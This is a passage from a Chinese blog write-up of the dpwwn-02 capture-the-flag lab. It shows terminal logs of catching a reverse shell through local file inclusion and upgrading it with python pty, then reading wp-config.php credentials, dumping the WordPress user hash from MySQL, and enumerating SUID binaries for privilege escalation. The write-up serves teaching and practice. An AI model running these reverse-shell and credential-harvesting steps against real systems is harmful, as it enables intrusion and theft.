title="本地文件包含+文件上传getshell"></a>本地文件包含+文件上传getshell</h2><p>提前开启监听，通过本地文件包含漏洞去访问，getshell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443                                                            <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [10.10.10.128] from (UNKNOWN) [10.10.10.10] 50768<br>Linux dpwwn-02 5.0.0-23-generic <span class="hljs-comment">#24-Ubuntu SMP Mon Jul 29 15:36:44 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br> 07:26:38 up  4:31,  0 <span class="hljs-built_in">users</span>,  load average: 1.51, 14.28, 13.10<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux dpwwn-02 5.0.0-23-generic #24-Ubuntu SMP Mon Jul 29 15:36:44 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 00:0c:29:61:24:b2 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 10.10.10.10/24 brd 10.10.10.255 scope global ens33</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::20c:29ff:fe61:24b2/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@dpwwn-02:/$ export TERM=xterm-color</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="wp-config-文件"><a href="#wp-config-文件" class="headerlink" title="wp-config 文件"></a>wp-config 文件</h3><p>去看看 wp-config 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dpwwn-02:/$ <span class="hljs-built_in">cd</span> /var/www<br><span class="hljs-built_in">cd</span> /var/www<br>www-data@dpwwn-02:/var/www$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 12K<br>268303 drwxr-xr-x  3 root root 4.0K Aug  7  2019 .<br> 16386 drwxr-xr-x 14 root root 4.0K Aug  7  2019 ..<br>268305 drwxr-xr-x  3 root root 4.0K Aug  8  2019 html<br>www-data@dpwwn-02:/var/www$ <span class="hljs-built_in">cd</span> html<br><span class="hljs-built_in">cd</span> html<br>www-data@dpwwn-02:/var/www/html$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 28K<br>268305 drwxr-xr-x 3 root     root     4.0K Aug  8  2019 .<br>268303 drwxr-xr-x 3 root     root     4.0K Aug  7  2019 ..<br>268311 -r-------- 1 root     root      11K Aug  7  2019 index.html<br>281706 -rw-r--r-- 1 root     root      184 Aug  8  2019 index.php<br>268687 drwxr-xr-x 5 www-data www-data 4.0K Aug  7  2019 wordpress<br>www-data@dpwwn-02:/var/www/html$ <span class="hljs-built_in">cd</span> wordpress<br><span class="hljs-built_in">cd</span> wordpress<br>www-data@dpwwn-02:/var/www/html/wordpress$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 216K<br>268687 drwxr-xr-x  5 www-data www-data 4.0K Aug  7  2019 .<br>268305 drwxr-xr-x  3 root     root     4.0K Aug  8  2019 ..<br>280668 -rwxr-xr-x  1 www-data www-data  256 Aug  7  2019 .htaccess<br>268703 -rwxr-xr-x  1 www-data www-data  420 Nov 30  2017 index.php<br>269532 -rwxr-xr-x  1 www-data www-data  20K Jan  1  2019 license.txt<br>268699 -rwxr-xr-x  1 www-data www-data 7.3K Apr  8  2019 readme.html<br>269761 -rwxr-xr-x  1 www-data www-data 6.8K Jan 12  2019 wp-activate.php<br>269762 drwxr-xr-x  9 www-data www-data 4.0K Jun 18  2019 wp-admin<br>268697 -rwxr-xr-x  1 www-data www-data  369 Nov 30  2017 wp-blog-header.php<br>280653 -rwxr-xr-x  1 www-data www-data 2.3K Jan 21  2019 wp-comments-post.php<br>268707 -rwxr-xr-x  1 www-data www-data 2.9K Jan  8  2019 wp-config-sample.php<br>280667 -rwxr-xr-x  1 www-data www-data 3.2K Aug  7  2019 wp-config.php<br>269533 drwxr-xr-x  6 www-data www-data 4.0K Jun 29 07:16 wp-content<br>268705 -rwxr-xr-x  1 www-data www-data 3.8K Jan  9  2019 wp-cron.php<br>533945 drwxr-xr-x 20 www-data www-data  12K Jun 18  2019 wp-includes<br>269759 -rwxr-xr-x  1 www-data www-data 2.5K Jan 16  2019 wp-links-opml.php<br>269760 -rwxr-xr-x  1 www-data www-data 3.3K Nov 30  2017 wp-load.php<br>268709 -rwxr-xr-x  1 www-data www-data  39K Jun 10  2019 wp-login.php<br>269758 -rwxr-xr-x  1 www-data www-data 8.3K Nov 30  2017 wp-mail.php<br>269505 -rwxr-xr-x  1 www-data www-data  19K Mar 28  2019 wp-settings.php<br>268701 -rwxr-xr-x  1 www-data www-data  31K Jan 16  2019 wp-signup.php<br>280652 -rwxr-xr-x  1 www-data www-data 4.7K Nov 30  2017 wp-trackback.php<br>268693 -rwxr-xr-x  1 www-data www-data 3.0K Aug 17  2018 xmlrpc.php<br>www-data@dpwwn-02:/var/www/html/wordpress$ <span class="hljs-built_in">cat</span> wp-config.php<br><span class="hljs-built_in">cat</span> wp-config.php<br>&lt;?php<br>/**<br> * The base configuration <span class="hljs-keyword">for</span> WordPress<br> *<br> * The wp-config.php creation script uses this file during the<br> * installation. You don\<span class="hljs-string">&#x27;t have to use the web site, you can</span><br><span class="hljs-string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * This file contains the following configurations:</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * * MySQL settings</span><br><span class="hljs-string"> * * Secret keys</span><br><span class="hljs-string"> * * Database table prefix</span><br><span class="hljs-string"> * * ABSPATH</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @package WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-string">/** The name of the database for WordPress */</span><br><span class="hljs-string">define( &#x27;</span>DB_NAME<span class="hljs-string">&#x27;, &#x27;</span>dpwwn02<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database username */</span><br><span class="hljs-string">define( &#x27;</span>DB_USER<span class="hljs-string">&#x27;, &#x27;</span>wpuser<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database password */</span><br><span class="hljs-string">define( &#x27;</span>DB_PASSWORD<span class="hljs-string">&#x27;, &#x27;</span>wp$%bd(*&amp;u$)rJmKa<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL hostname */</span><br><span class="hljs-string">define( &#x27;</span>DB_HOST<span class="hljs-string">&#x27;, &#x27;</span>localhost<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Database Charset to use in creating database tables. */</span><br><span class="hljs-string">define( &#x27;</span>DB_CHARSET<span class="hljs-string">&#x27;, &#x27;</span>utf8mb4<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** The Database Collate type. Don\&#x27;</span>t change this <span class="hljs-keyword">if</span> <span class="hljs-keyword">in</span> doubt. */<br>define( <span class="hljs-string">&#x27;DB_COLLATE&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span> );<br><br>/**<span class="hljs-comment">#@+</span><br> * Authentication Unique Keys and Salts.<br> *<br> * Change these to different unique phrases!<br> * You can generate these using the &#123;@<span class="hljs-built_in">link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;<br> * You can change these at any point <span class="hljs-keyword">in</span> time to invalidate all existing cookies. This will force all <span class="hljs-built_in">users</span> to have to <span class="hljs-built_in">log</span> <span class="hljs-keyword">in</span> again.<br> *<br> * @since 2.6.0<br> */<br>define( <span class="hljs-string">&#x27;AUTH_KEY&#x27;</span>,         <span class="hljs-string">&#x27;tppc%]*HG&gt;YdA%WexT&amp;5+03&lt;/`+&lt;ddzoOFNt/`^c@4N5&lt;f;++(3(7+gb(&#125;3W1^je&#x27;</span> );<br>define( <span class="hljs-string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="hljs-string">&#x27;7B:6=Yxs+?;&gt;,Nzo0RzUC_0H9@+Afbr+w~k&lt;;m#IiqkzMzz[iac7[&gt;=SfSN+Kf+K&#x27;</span> );<br>define( <span class="hljs-string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="hljs-string">&#x27;8]UL$#O2owarV?r7&#123;v!#]YJeJVh]thhdp_U)QQRJcs%JhR&#125;#vo(7*(9bJ~K%WYzY&#x27;</span> );<br>define( <span class="hljs-string">&#x27;NONCE_KEY&#x27;</span>,        <span class="hljs-string">&#x27;&lt;Q3xN0jUeAS|&gt;lM9qroI0H^([L]oJVG7c+%r`qH)oq:hwh+&amp;dP,xQ4[H_xr(]VBY&#x27;</span> );<br>define( <span class="hljs-string">&#x27;AUTH_SALT&#x27;</span>,        <span class="hljs-string">&#x27;&#125;n57d s@&amp;5*~WiN|`&amp;wv&amp;uMs9(REUg&gt;n!(2mC&#125;0r[#NW&#123;O=[E&amp;Ml0tmc!&#123;1uCk~+&#x27;</span> );<br>define( <span class="hljs-string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="hljs-string">&#x27;P(|TAVr[ p1@&lt;bfV50SSL13Dof`Fj+ZyF#&lt;:Ppu[(,&#123;hv1q&lt;@#tXMJ-KawIg~Voy&#x27;</span> );<br>define( <span class="hljs-string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="hljs-string">&#x27;8c *i~o;jB,[YmV4WligV&#125;zE@1G5XHNR@m&#123;U.#j TQgIUA)Mi_fc+js5O@%IWd&#125;f&#x27;</span> );<br>define( <span class="hljs-string">&#x27;NONCE_SALT&#x27;</span>,       <span class="hljs-string">&#x27;K_b9JPi0B$HAj!Uig&#125;Mu[![kC.W!]c%3&gt;JE*=&#125;)kRN*AK%qjcSTfy|xu.N|;AzAJ&#x27;</span> );<br><br>/**<span class="hljs-comment">#@-*/</span><br><br>/**<br> * WordPress Database Table prefix.<br> *<br> * You can have multiple installations <span class="hljs-keyword">in</span> one database <span class="hljs-keyword">if</span> you give each<br> * a unique prefix. Only numbers, letters, and underscores please!<br> */<br><span class="hljs-variable">$table_prefix</span> = <span class="hljs-string">&#x27;wp_&#x27;</span>;<br><br>/**<br> * For developers: WordPress debugging mode.<br> *<br> * Change this to <span class="hljs-literal">true</span> to <span class="hljs-built_in">enable</span> the display of notices during development.<br> * It is strongly recommended that plugin and theme developers use WP_DEBUG<br> * <span class="hljs-keyword">in</span> their development environments.<br> *<br> * For information on other constants that can be used <span class="hljs-keyword">for</span> debugging,<br> * visit the Codex.<br> *<br> * @<span class="hljs-built_in">link</span> https://codex.wordpress.org/Debugging_in_WordPress<br> */<br>define( <span class="hljs-string">&#x27;WP_DEBUG&#x27;</span>, <span class="hljs-literal">false</span> );<br><br>/* That\<span class="hljs-string">&#x27;s all, stop editing! Happy publishing. */</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Absolute path to the WordPress directory. */</span><br><span class="hljs-string">if ( ! defined( &#x27;</span>ABSPATH<span class="hljs-string">&#x27; ) ) &#123;</span><br><span class="hljs-string">        define( &#x27;</span>ABSPATH<span class="hljs-string">&#x27;, dirname( __FILE__ ) . &#x27;</span>/<span class="hljs-string">&#x27; );</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Sets up WordPress vars and included files. */</span><br><span class="hljs-string">require_once( ABSPATH . &#x27;</span>wp-settings.php<span class="hljs-string">&#x27; );</span><br><span class="hljs-string">@ini_set(&#x27;</span>upload_max_size<span class="hljs-string">&#x27; , &#x27;</span>256M<span class="hljs-string">&#x27; );</span><br></code></pre></td></tr></table></figure><p>拿到了一个密码 <code>wp$%bd(*&amp;u$)rJmKa</code>，数据库用户名是 wpuser，进数据库看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dpwwn-02:/var/www/html/wordpress$ mysql -u wpuser -p<br>mysql -u wpuser -p<br>Enter password: wp$%bd(*&amp;u$)rJmKa<br><br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection <span class="hljs-built_in">id</span> is 219596<br>Server version: 5.7.27-0ubuntu0.19.04.1 (Ubuntu)<br><br>Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>mysql&gt; show databases;<br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| dpwwn02            |<br>+--------------------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; use dpwwn02<br>use dpwwn02<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>mysql&gt; show tables;<br>show tables;<br>+-----------------------+<br>| Tables_in_dpwwn02     |<br>+-----------------------+<br>| wp_commentmeta        |<br>| wp_comments           |<br>| wp_links              |<br>| wp_options            |<br>| wp_postmeta           |<br>| wp_posts              |<br>| wp_term_relationships |<br>| wp_term_taxonomy      |<br>| wp_termmeta           |<br>| wp_terms              |<br>| wp_usermeta           |<br>| wp_users              |<br>+-----------------------+<br>12 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; <span class="hljs-keyword">select</span> * from wp_users;<br><span class="hljs-keyword">select</span> * from wp_users;<br>+----+------------+------------------------------------+---------------+------------------------+----------+---------------------+---------------------+-------------+--------------+<br>| ID | user_login | user_pass                          | user_nicename | user_email             | user_url | user_registered     | user_activation_key | user_status | display_name |<br>+----+------------+------------------------------------+---------------+------------------------+----------+---------------------+---------------------+-------------+--------------+<br>|  1 | admin      | $P<span class="hljs-variable">$BPdPCvh2zdEdcnDqH7f9kpWjCeOYxm</span>. | admin         | dpwwn-02@dpwwn-02.test |          | 2019-08-07 08:10:32 |                     |           0 | admin        |<br>+----+------------+------------------------------------+---------------+------------------------+----------+---------------------+---------------------+-------------+--------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><p>数据库只有一个用户 admin 用户密码经过了 md5 哈希，在线网站查询失败</p><h3 id="信息收集与定时任务查看"><a href="#信息收集与定时任务查看" class="headerlink" title="信息收集与定时任务查看"></a>信息收集与定时任务查看</h3><p>看看定时任务吧，之前文件包含的时候尝试过，这里直接贴图</p><p><img src="/pic/92867ff6bb3a67d18963a468069784f2_MD5.png"></p><p>信息收集一下，然后查看 s 权限的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dpwwn-02:/home$ <span class="hljs-built_in">cd</span> rootadmin<br><span class="hljs-built_in">cd</span> rootadmin<br>www-data@dpwwn-02:/home/rootadmin$ <span class="hljs-built_in">ls</span> -laih<br><span class="hljs-built_in">ls</span> -laih<br>total 52K<br>405523 drwxr-xr-x 4 rootadmin rootadmin 4.0K Aug  8  2019 .<br>393218 drwxr-xr-x 4 root      root      4.0K Aug  8  2019 ..<br>407110 -rw------- 1 root      root         6 Aug  8  2019 .bash_history<br>405525 -rw-r--r-- 1 rootadmin rootadmin  220 Apr  4  2019 .bash_logout<br>405524 -rw-r--r-- 1 rootadmin rootadmin 3.7K Apr  4  2019 .bashrc<br>531299 drwx------ 2 rootadmin rootadmin 4.0K Aug  7  2019 .cache<br>531301 drwx------ 3 rootadmin rootadmin 4.0K Aug  7  2019 .gnupg<br>407111 -rw------- 1 root      root         1 Aug  8  2019 .mysql_history<br>405526 -rw-r--r-- 1 rootadmin rootadmin  807 Apr  4  2019 .profile<br>405573 -rw-r--r-- 1 rootadmin rootadmin    1 Aug  8  2019 .sudo_as_admin_successful<br>407199 -rw------- 1 root      root       12K Aug  8  2019 .viminfo<br>www-data@dpwwn-02:/home/rootadmin$ <span class="hljs-built_in">cat</span> .sudo_as_admin_successful<br><span class="hljs-built_in">cat</span> .sudo_as_admin_successful<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dpwwn-02:/home/rootadmin$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>      656     36 -rwsr-xr-x   1 root     root        34896 Mar  5  2019 /usr/bin/fusermount<br>      839     64 -rwsr-xr-x   1 root     root        63736 Mar 22  2019 /usr/bin/passwd<br>      551     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /usr/bin/chsh<br>     1120     36 -rwsr-xr-x   1 root     root        34888 Feb 22  2019 /usr/bin/umount<br>      648    312 -rwsr-xr-x   1 root     root       315904 Feb 16  2019 /usr/bin/find<br>     1051    156 -rwsr-xr-x   1 root     root       157192 Feb 19  2019 /usr/bin/sudo<br>      792     48 -rwsr-xr-x   1 root     root        47184 Feb 22  2019 /usr/bin/mount<br>      479     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at<br>      545     80 -rwsr-xr-x   1 root     root        80592 Mar 22  2019 /usr/bin/chfn<br>     1050     64 -rwsr-xr-x   1 root     root        63568 Feb 22  2019 /usr/bin/su<br>      807     44 -rwsr-xr-x   1 root     root        44440 Mar 22  2019 /usr/bin/newgrp<br>      666     84 -rwsr-xr-x   1 root     root        84016 Mar 22  2019 /usr/bin/gpasswd<br>     7517    108 -rwsr-sr-x   1 root     root       109432 Mar 21  2019 /usr/lib/snapd/snap-confine<br>     1335     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>     1548    428 -rwsr-xr-x   1 root     root       436552 Apr  8  2019 /usr/lib/openssh/ssh-keysign<br>     4238     52 -rwsr-xr--   1 root     messagebus    51184 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>    12428    120 -rwsr-xr-x   1 root     root         121528 Apr  1  2019 /usr/sbin/mount.nfs<br>       66     40 -rwsr-xr-x   1 root     root          40152 May 16  2018 /snap/core/6673/bin/mount<br>       80     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /snap/core/6673/bin/ping<br>       81     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /snap/core/6673/bin/ping6<br>       98     40 -rwsr-xr-x   1 root     root          40128 May 17  2017 /snap/core/6673/bin/su<br>      116     27 -rwsr-xr-x   1 root     root          27608 May 16  2018 /snap/core/6673/bin/umount<br>     2657     71 -rwsr-xr-x   1 root     root          71824 May 17  2017 /snap/core/6673/usr/bin/chfn<br>     2659     40 -rwsr-xr-x   1 root     root          40432 May 17  2017 /snap/core/6673/usr/bin/chsh<br>     2735     74 -rwsr-xr-x   1 root     root          75304 May 17  2017 /snap/core/6673/usr/bin/gpasswd<br>     2827     39 -rwsr-xr-x   1 root     root          39904 May 17  2017 /snap/core/6673/usr/bin/newgrp<br>     2840     53 -rwsr-xr-x   1 root     root          54256 May 17  2017 /snap/core/6673/usr/bin/passwd<br>     2950    134 -rwsr-xr-x   1 root     root         136808 Jul  4  2017 /snap/core/6673/usr/bin/sudo<br>     3049     42 -rwsr-xr--   1 root     systemd-network    42992 Jan 12  2017 /snap/core/6673/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     3419    419 -rwsr-xr-x   1 root     root              428240 Mar  4  2019 /snap/core/6673/usr/lib/openssh/ssh-keysign<br>     6449     97 -rwsr-sr-x   1 root     root               98472 Mar 21  2019 /snap/core/6673/usr/lib/snapd/snap-confine<br>     7619    386 -rwsr-xr--   1 root     dip               394984 Jun 12  2018 /snap/core/6673/usr/sbin/pppd<br>       66     40 -rwsr-xr-x   1 root     root               40152 May 15  2019 /snap/core/7270/bin/mount<br>       80     44 -rwsr-xr-x   1 root     root               44168 May  7  2014 /snap/core/7270/bin/ping<br>       81     44 -rwsr-xr-x   1 root     root               44680 May  7  2014 /snap/core/7270/bin/ping6<br>       98     40 -rwsr-xr-x   1 root     root               40128 Mar 25  2019 /snap/core/7270/bin/su<br>      116     27 -rwsr-xr-x   1 root     root               27608 May 15  2019 /snap/core/7270/bin/umount<br>     2657     71 -rwsr-xr-x   1 root     root               71824 Mar 25  2019 /snap/core/7270/usr/bin/chfn<br>     2659     40 -rwsr-xr-x   1 root     root               40432 Mar 25  2019 /snap/core/7270/usr/bin/chsh<br>     2735     74 -rwsr-xr-x   1 root     root               75304 Mar 25  2019 /snap/core/7270/usr/bin/gpasswd<br>     2827     39 -rwsr-xr-x   1 root     root               39904 Mar 25  2019 /snap/core/7270/usr/bin/newgrp<br>     2840     53 -rwsr-xr-x   1 root     root               54256 Mar 25  2019 /snap/core/7270/usr/bin/passwd<br>     2950    134 -rwsr-xr-x   1 root     root              136808 Jun 10  2019 /snap/core/7270/usr/bin/sudo<br>     3049     42 -rwsr-xr--   1 root     systemd-network    42992 Jun 10  2019 